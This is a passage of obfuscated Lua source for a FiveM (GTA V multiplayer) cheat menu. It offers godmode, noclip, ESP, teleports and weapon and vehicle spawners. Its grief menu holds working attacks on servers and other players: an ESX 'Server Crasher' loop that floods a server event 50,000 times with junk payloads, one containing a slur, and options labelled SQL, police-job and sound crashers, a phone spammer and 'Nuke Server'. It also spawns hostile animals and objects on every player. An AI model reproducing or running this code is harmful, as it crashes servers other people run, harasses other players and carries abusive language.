			if fjustimenUI.GaNIUyizUH("Noclip", fjustimen.Player.isNoclipping, function(enabled) 
				fjustimen.Player.isNoclipping = enabled 
				if fjustimen.Player.isNoclipping then
					SetEntityVisible(PlayerPedId(), false, false)
				else
					SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
					SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
					SetEntityVisible(PlayerPedId(), true, false)
				end
            end) then end
            
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("SelfSuperPowers") then
			if fjustimenUI.GaNIUyizUH("Godmode | ~r~Native", Godmode, function(enabled) Godmode = enabled end) then

			end

			if fjustimenUI.GaNIUyizUH("Super Jump | ~r~Native", MgKGsljioI, function(enabled) MgKGsljioI = enabled end) then

			end

			if fjustimenUI.GaNIUyizUH("Invisibility | ~r~Native", Invisible, function(enabled) Invisible = enabled end) then

			end

			if fjustimenUI.GaNIUyizUH("Magneto | ~r~Native", fjustimen.Toggle.EOwuAPjpvo) then
				EOwuAPjpvo()
            end

            if fjustimenUI.GaNIUyizUH("Become Tiny | ~r~Native", mCJalfhaDHF, function(enabled) mCJalfhaDHF = enabled end) then
			end
            
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("TeleportMenu") then
			if fjustimenUI.GwGoBeHRde("Teleport to waypoint", "~r~Native")  then
				liiUZlzltw()
			end

			if fjustimenUI.GwGoBeHRde("Teleport To Custom Coords", "~r~Native") then
			local dTHJfwnTI = RNDpymkwNb("X Coord", " ", 5)
                    local TUXp2D1KV5nKk = RNDpymkwNb("Y Coord", " ", 5)
                    local Y8N5kyPcRIaA = RNDpymkwNb("Z Coord", " ", 3)
                    if dTHJfwnTI ~= " " or TUXp2D1KV5nKk ~= " " then
                        if Y8N5kyPcRIaA ~= " " then
                            Y8N5kyPcRIaA = 30
                        end
                        if
                            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                         then
                            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                        else
                            entity = GetPlayerPed(-1)
                        end
                        if entity then
                            SetEntityCoords(
                                entity,
                                tonumber(dTHJfwnTI),
                                tonumber(TUXp2D1KV5nKk),
                                tonumber(Y8N5kyPcRIaA)
                            )
						end
					end
			end

			if fjustimenUI.GwGoBeHRde("Show Coords", "~b~Not Implented Yet")  then
	
			end

			if fjustimenUI.GwGoBeHRde("Teleport To ~g~Weed Farm", "~r~Native")  then
				SetEntityCoords(PlayerPedId(), 1066.009, -3183.386, -39.164)
			end

			if fjustimenUI.GwGoBeHRde("Teleport To ~b~Meth Farm", "~r~Native")  then
				SetEntityCoords(PlayerPedId(), 998.629, -3199.545, -36.394)
			end

			if fjustimenUI.GwGoBeHRde("Teleport To ~r~Coke Farm", "~r~Native")  then
				SetEntityCoords(PlayerPedId(), 1088.636, -3188.551, -38.993)
			end

			if fjustimenUI.GwGoBeHRde("Teleport To ~y~Money Wash", "~r~Native")  then
				SetEntityCoords(PlayerPedId(), 1118.405, -3193.687, -40.394)
			end
	
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("VisualMenu") then
			-- if
			-- 	fjustimenUI.GaNIUyizUH(
			-- 	"WuvhbyghIk",
			-- 	WuvhbyghIk,
			-- 	function(enabled)
			-- 	WuvhbyghIk = enabled
			-- 	end)
			-- then
			-- elseif
			-- 	fjustimenUI.GaNIUyizUH(
			-- 	"Ajm",
			-- 	Ajm,
			-- 	function(enabled)
			-- 	Ajm = Ajm
			-- 	end)
            -- then
			if fjustimenUI.NgPSWlTpNm("ESP", "ESPMenu") then end
			if fjustimenUI.GaNIUyizUH("Force Crosshair", pBNAnrVJeN, function(enabled) pBNAnrVJeN = enabled end) then end
			if fjustimenUI.GaNIUyizUH("Force Minimap", showMinimap, function(enabled) showMinimap = enabled end) then end
			if fjustimenUI.GaNIUyizUH("Force Player Blips", DWimOawaSE, function(enabled) DWimOawaSE = enabled end) then end
            if fjustimenUI.GaNIUyizUH("Force Gamertags", DCgutDvdii, function(enabled) DCgutDvdii = enabled end) then end
            if fjustimenUI.GaNIUyizUH("Night Vision", nWEHC6n0j4g92, function(enabled) nWEHC6n0j4g92 = enabled end) then end
            if fjustimenUI.GaNIUyizUH("Heat Vision", JAi7EkCyHw2ioIQ, function(enabled) JAi7EkCyHw2ioIQ = enabled end) then end
            if fjustimenUI.GwGoBeHRde("Optimize FPS", "~r~Native") then
                TlEinQlrUD.aWxBYGYMOL()
            end


			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("ESPMenu") then
			if fjustimenUI.GaNIUyizUH("Enabled", POuIlWuuNr, function(enabled) POuIlWuuNr = enabled end) then end
			if fjustimenUI.GaNIUyizUH("Names", wTidxlTEUx, function(enabled) wTidxlTEUx = enabled end) then end
			if fjustimenUI.GaNIUyizUH("Distance", mhlFusMedW, function(enabled) mhlFusMedW = enabled end) then end
			if fjustimenUI.GaNIUyizUH("Vehicle", ejXiFNwVAD, function(enabled) ejXiFNwVAD = enabled end) then end
			if fjustimenUI.GaNIUyizUH("ID", vmWkYkiWPE, function(enabled) vmWkYkiWPE = enabled end) then end
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("GriefMenu") then
			if fjustimenUI.GwGoBeHRde("Airstrike Waypoint") then
				eyWAcbvWuv()
			end

			if fjustimenUI.GwGoBeHRde("Remove All Weapons From Everyone") then
				local plist = GetActivePlayers()
				for i = 1, #plist do
					local id = plist[i]
					local ped = GetPlayerPed(id)
					hfSPELVLBp(ped)
					for i = 1, #t_Weapons do
						RemoveWeaponFromPed(ped, t_Weapons[i][1])
					end
				end
			end

			if fjustimenUI.GwGoBeHRde("Kick All From Vehicles") then
				CqljTYSTQB()
			end
			
			if fjustimenUI.GwGoBeHRde("~b~XD ~g~ALL ~r~PLAYERS ~r~IN ~y~VEHICLE", "~r~Native") then
				for i=0, 300 do
				local coords = GetEntityCoords(GetPlayerPed(i), true)
				local hashball = "stt_prop_stunt_soccer_ball"
							while not HasModelLoaded(GetHashKey(hashball)) do
							  Citizen.Wait(0)
							  RequestModel(GetHashKey(hashball))
							end
							local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
							SetEntityVisible(ball, 0, 0)
							AttachEntityToEntity(ball, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)
	
				end
			end

			if fjustimenUI.GwGoBeHRde("~r~Spawn ~b~Crazy ~y~Shit ~p~On ~g~Everyone") then
				TlEinQlrUD.dIwyUZHKyR()
			end
            
			if fjustimenUI.GwGoBeHRde("~r~Sandy all players") then
				sandy()
			end

                if fjustimenUI.GwGoBeHRde("~h~~p~UFO ~r~all players") then
                    ufosnigga()
                end

                if fjustimenUI.GwGoBeHRde("~h~~r~XDDDDD all players") then
                    tabletc()
                end

            if fjustimenUI.GwGoBeHRde("~r~mazeban all players") then
            	mazebank()
            end

            if fjustimenUI.GwGoBeHRde("~b~Spawn Mountains Lions On Everyone") then
            local mtlion = "A_C_MtLion"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
            end

            if fjustimenUI.GwGoBeHRde("~b~Spawn Burger On Everyone") then
                for i = 0, 128 do
                    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                        local eb = 'xs_prop_hamburgher_wl'
                        local ec = -145066854
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetVehiclePedIsIn(GetPlayerPed(i), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local eb = 'xs_prop_hamburgher_wl'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetPlayerPed(i),
                            GetPedBoneIndex(GetPlayerPed(i), 0),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
			end
			
			if fjustimenUI.GwGoBeHRde("~r~N~b~u~p~k~w~e Server", "~r~Need an Update! Dont use!") then
                TlEinQlrUD.ypmedWFxln()
			end
			
			--Kashacters
			
			if fjustimenUI.GwGoBeHRde("~g~ESX ~r~Server Crasher", "~g~ESX") then
				for i = 1, 50000 do 
					TriggerServerEvent('esx_skin:responseSaveSkin', {Ninjas = 'ninjuskills'}) 
					TriggerServerEvent('esx_skin:responseSaveSkin', 'faggots eat shit') 
				end
			end

            if fjustimenUI.GwGoBeHRde("~r~Kashacters SQL Crasher", "~g~ESX") then
                TlEinQlrUD.tKeeBLPVmW()
            end

            if fjustimenUI.GwGoBeHRde("~r~Interact Sound Crasher", "~g~ESX") then
                TlEinQlrUD.QKiwltJyjK()
            end

            if fjustimenUI.GwGoBeHRde("~r~Phone Spammer", "~g~ESX") then
                TlEinQlrUD.BcydOwHofs()
            end

            if fjustimenUI.GwGoBeHRde("~r~Policejob Crasher", "~g~ESX") then
                TlEinQlrUD.yiUUVcYhwM()
            end

            if fjustimenUI.GwGoBeHRde("~r~License Table Spammer", "~g~ESX") then
                TlEinQlrUD.rhvjbMgDec()
            end

           

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalWepMenu") then
			
			if fjustimenUI.NgPSWlTpNm("Weapon Spawner", "LocalWepCategory") then
			end

			-- if fjustimenUI.NgPSWlTpNm("Ajm Options", "AjmOptions") then
			-- end

			if fjustimenUI.GaNIUyizUH("Rapid Fire", fjustimen.Toggle.RapidFire) then
				fjustimen.Toggle.RapidFire = not fjustimen.Toggle.RapidFire
			end

			-- SetWeaponDamageModifier(`WEAPON_PISTOL`, 100.0)
			if fjustimenUI.pJZvwZInDS("Damage Modifier", OPNzApXRyi.DamageModifier.Words, OPNzApXRyi.DamageModifier.Selected, function(selectedIndex)
				if OPNzApXRyi.DamageModifier.Selected ~= selectedIndex then
					OPNzApXRyi.DamageModifier.Selected = selectedIndex
				end
			end) then end
			-- print(GetEntitySpeed(fjustimen.Player.Vehicle) * 2.2369356)
			if fjustimenUI.GwGoBeHRde("~g~Give All Weapons") then
				PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				for i = 1, #t_Weapons do
					GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], 256, false, false)
				end
			end
			
			if fjustimenUI.GwGoBeHRde("~r~Remove All Weapons") then
				for i = 1, #t_Weapons do
					RemoveWeaponFromPed(PlayerPedId(), t_Weapons[i][1])
				end
			end

			if fjustimenUI.GwGoBeHRde("Set current weapon ammo") then
				local _, weaponHash = GetCurrentPedWeapon(PlayerPedId())
				local amount = RNDpymkwNb("Ammo amount", "", 3)
				local ammo = floor(tonumber(amount) + 0.5)
				SetPedAmmo(PlayerPedId(), weaponHash, ammo)
			end

			if fjustimenUI.GaNIUyizUH("Infinite Ammo", InfAmmo, function(enabled) InfAmmo = enabled SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo) end) then end	
		--	if fjustimenUI.GaNIUyizUH("Vehicle Gun", VehicleGun, function(enabled) VehicleGun = enabled end) then end		
			if fjustimenUI.GaNIUyizUH("Delete Gun", fjustimen.Toggle.DeleteGun) then 
				fjustimen.Toggle.DeleteGun = not fjustimen.Toggle.DeleteGun
			end

			fjustimenUI.pyCDRpSJBU()
			-- [NOTE] Local Weapon Menu
		elseif fjustimenUI.aWlfWfxYaq("AjmOptions") then
			if fjustimenUI.GwGoBeHRde("Ajm") then
				
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalWepCategory") then
			fjustimenUI.NgPSWlTpNm("Melee", "LocalMeleeWeapons")
			fjustimenUI.NgPSWlTpNm("Handguns", "LocalSidearmWeapons")
			fjustimenUI.NgPSWlTpNm("Submachine Guns", "LocalSmgWeapons")
			fjustimenUI.NgPSWlTpNm("Shotguns", "LocalShotgunWeapons")
			fjustimenUI.NgPSWlTpNm("Assault Rifles", "LocalAssaultRifleWeapons")
			fjustimenUI.NgPSWlTpNm("Light Machine Guns", "LocalMachineGunWeapons")
			fjustimenUI.NgPSWlTpNm("Sniper Rifles", "LocalSniperRifles")
			fjustimenUI.NgPSWlTpNm("Heavy Weapons", "LocalHeavyWeapons")

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalMeleeWeapons") then
			local selectedWeapon = {}
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "melee" then
					if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
						PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], 0, false, false)
					end
					selectedWeapon[optionCount] = i
				end
			end

			-- fjustimenUI.OWvsPvaGDV(selectedWeapon[menus[currentMenu].currentOption])
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalSidearmWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "handguns" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if fjustimenUI.ComboBox(t_Weapons[i][2], tSyjzWZfIi.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. tSyjzWZfIi.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalAssaultRifleWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "assaultrifles" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if fjustimenUI.ComboBox(t_Weapons[i][2], tSyjzWZfIi.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. tSyjzWZfIi.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalShotgunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "shotguns" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if fjustimenUI.ComboBox(t_Weapons[i][2], tSyjzWZfIi.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. tSyjzWZfIi.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			fjustimenUI.pyCDRpSJBU()	
		elseif fjustimenUI.aWlfWfxYaq("LocalMachineGunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "lmgs" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if fjustimenUI.ComboBox(t_Weapons[i][2], tSyjzWZfIi.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. tSyjzWZfIi.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalSmgWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "smgs" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if fjustimenUI.ComboBox(t_Weapons[i][2], tSyjzWZfIi.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. tSyjzWZfIi.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalSniperRifles") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "sniperrifles" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if fjustimenUI.ComboBox(t_Weapons[i][2], tSyjzWZfIi.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. tSyjzWZfIi.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalHeavyWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "heavyweapons" then
					if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
						PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
					end
				end
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalVehicleMenu") then

			if fjustimenUI.NgPSWlTpNm("Vehicle Spawner", "LocalVehicleSpawner") then
			end

			if fjustimenUI.ComboBox("Vehicle Actions", tSyjzWZfIi.VehicleActions.Words, tSyjzWZfIi.VehicleActions.Selected, function(selectedIndex)
				if tSyjzWZfIi.VehicleActions.Selected ~= selectedIndex then
					tSyjzWZfIi.VehicleActions.Selected = selectedIndex
				end
			end) then 
				tSyjzWZfIi.VehicleActions.Values[tSyjzWZfIi.VehicleActions.Selected](fjustimen.Player.Vehicle)
			end

			if fjustimenUI.GwGoBeHRde("Repair Vehicle Engine Only", "~r~Native") then
				TlEinQlrUD.QsIDnVhZJH()
			end

			if fjustimenUI.GwGoBeHRde("Teleport To Nearest Vehicle", "~r~Native") then
				TlEinQlrUD.LNhEwrxqhF()
			end

			if fjustimenUI.NgPSWlTpNm("Modify Vehicle", "LSC") then end

			if fjustimenUI.GaNIUyizUH("Easy Handling", fjustimen.Toggle.EasyHandling) then
				fjustimen.Toggle.EasyHandling = not fjustimen.Toggle.EasyHandling
			end

			if fjustimenUI.GaNIUyizUH("Seatbelt (No Fall)", fjustimen.Toggle.VehicleNoFall) then
				fjustimen.Toggle.VehicleNoFall = not fjustimen.Toggle.VehicleNoFall
			end

			if fjustimenUI.GaNIUyizUH("No Collision", fjustimen.Toggle.VehicleCollision, function(enabled) 
				fjustimen.Toggle.VehicleCollision = enabled
			end) then end

			if fjustimenUI.ComboBox("Vehicle Hygiene", tSyjzWZfIi.DirtLevel.Words, tSyjzWZfIi.DirtLevel.Selected(fjustimen.Player.Vehicle), function(selectedIndex)
				if tSyjzWZfIi.DirtLevel.Selected(fjustimen.Player.Vehicle) ~= tSyjzWZfIi.DirtLevel.Values[selectedIndex] then
					SetVehicleDirtLevel(fjustimen.Player.Vehicle, tSyjzWZfIi.DirtLevel.Values[selectedIndex])
				end
			end) then end
			
			if fjustimenUI.GwGoBeHRde("Change License Plate") then
				CjnRjcjCLG(fjustimen.Player.Vehicle)
			end

			if fjustimenUI.GaNIUyizUH("Rainbow Vehicle Color", fjustimen.Toggle.zuHwvdRxVq, zuHwvdRxVq) then 
			end

			if fjustimenUI.GaNIUyizUH("Vehicle Godmode", zgpiMcBGab,
					function(enabled)
						zgpiMcBGab = enabled
					end) 
				then
			end
			if fjustimenUI.GaNIUyizUH("Speedboost ~g~SHIFT ~r~CTRL", BjJgNzTeQO,
					function(enabled)
					BjJgNzTeQO = enabled
					end)
				then
			end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("LocalVehicleSpawner") then
			if fjustimenUI.GaNIUyizUH("Spawn Inside", fjustimen.Toggle.SpawnInVehicle, function(enabled)
				fjustimen.Toggle.SpawnInVehicle = enabled
			end) then end
			
			if fjustimenUI.GaNIUyizUH("Replace Current", fjustimen.Toggle.ReplaceVehicle, function(enabled) 
				fjustimen.Toggle.ReplaceVehicle = enabled 
			end) then end


			if fjustimenUI.GwGoBeHRde("Spawn Vehicle by Hash") then
				local modelName = RNDpymkwNb("Enter vehicle spawn name", "", 20)
				if not modelName then -- Do nothing in case of accidentel press or change of mind
				elseif IsModelValid(modelName) and IsModelAVehicle(modelName) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				else
					fjustimenUI.SendNotification({text = string.format("%s is not a valid vehicle", modelName), type = 'error'})
				end
			end
			if fjustimenUI.NgPSWlTpNm("Compacts", "localcompacts") then end
			if fjustimenUI.NgPSWlTpNm("Sedans", "localsedans") then end
			if fjustimenUI.NgPSWlTpNm("SUVs", "localsuvs") then end
			if fjustimenUI.NgPSWlTpNm("Coupes", 'localcoupes') then end
			if fjustimenUI.NgPSWlTpNm("Muscle", 'localmuscle') then end
			if fjustimenUI.NgPSWlTpNm("Sports Classics", 'localsportsclassics') then end
			if fjustimenUI.NgPSWlTpNm("Sports", 'localsports') then end
			if fjustimenUI.NgPSWlTpNm("Super", 'localsuper') then end
			if fjustimenUI.NgPSWlTpNm('Motorcycles', 'localmotorcycles') then end
			if fjustimenUI.NgPSWlTpNm('Off-Road', 'localoffroad') then end
			if fjustimenUI.NgPSWlTpNm('Industrial', 'localindustrial') then end
			if fjustimenUI.NgPSWlTpNm('Utility', 'localutility') then end
			if fjustimenUI.NgPSWlTpNm('Vans', 'localvans') then end
			if fjustimenUI.NgPSWlTpNm('Cycles', 'localcycles') then end
			if fjustimenUI.NgPSWlTpNm('Boats', 'localboats') then end
			if fjustimenUI.NgPSWlTpNm('Helicopters', 'localhelicopters') then end
			if fjustimenUI.NgPSWlTpNm('Planes', 'localplanes') then end
			if fjustimenUI.NgPSWlTpNm('Service/Emergency/Military', 'localservice') then end
			if fjustimenUI.NgPSWlTpNm('Commercial/Trains', 'localcommercial') then end
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localcompacts') then
			for i = 1, #VehicleClass.compacts do
				local modelName = VehicleClass.compacts[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('compacts')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localsedans') then
			for i = 1, #VehicleClass.sedans do
				local modelName = VehicleClass.sedans[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('sedans')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localsuvs') then
			for i = 1, #VehicleClass.suvs do
				local modelName = VehicleClass.suvs[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('suvs')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localcoupes') then
			for i = 1, #VehicleClass.coupes do
				local modelName = VehicleClass.coupes[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('coupes')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localmuscle') then
			for i = 1, #VehicleClass.muscle do
				local modelName = VehicleClass.muscle[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('muscle')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localsportsclassics') then
			for i = 1, #VehicleClass.sportsclassics do
				local modelName = VehicleClass.sportsclassics[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if fjustimenUI.GwGoBeHRde(vehname) then
					gQOkxHiEJs(modelName, fjustimen.Toggle.ReplaceVehicle, fjustimen.Toggle.SpawnInVehicle)
				end
			end

			fjustimenUI.TsMRJQiFYw('sportsclassics')
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq('localsports') then
			for i = 1, #VehicleClass.sports do
				local modelName = VehicleClass.sports[i][1]
